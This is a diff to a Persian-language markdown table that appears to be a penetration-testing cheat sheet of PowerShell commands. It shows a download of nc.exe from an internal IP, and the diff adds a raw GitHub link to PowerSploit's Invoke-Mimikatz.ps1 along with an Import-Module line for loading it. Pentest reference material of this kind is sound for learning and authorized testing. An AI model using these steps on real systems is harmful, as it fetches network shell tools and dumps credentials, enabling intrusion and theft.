@@ -723,6 +723,8 @@ Step by step instructions on room362.com for step below
 | \(Net.DNS\]: :GetnostEntry\(" ip "I | فرآیند DNS Lookup |
 | powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | دریافت و ذخیره سازی فایل |
 | https://gist.githubusercontent.com/zhilich/b8480f1d22f9b15d4fdde07ddc6fa4ed/raw/8078a51bbfa18df36d8e890fefe96a06891dd47d/SimpleHttpServer.ps1 | وبسرور با پورت ۸۰۵۰ |
+| https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 | استفاده از mimikatz |
+| فراخوانی فایل های ps1 | Import-Module .\Invoke-Mimikatz.ps1 |
 
 
 
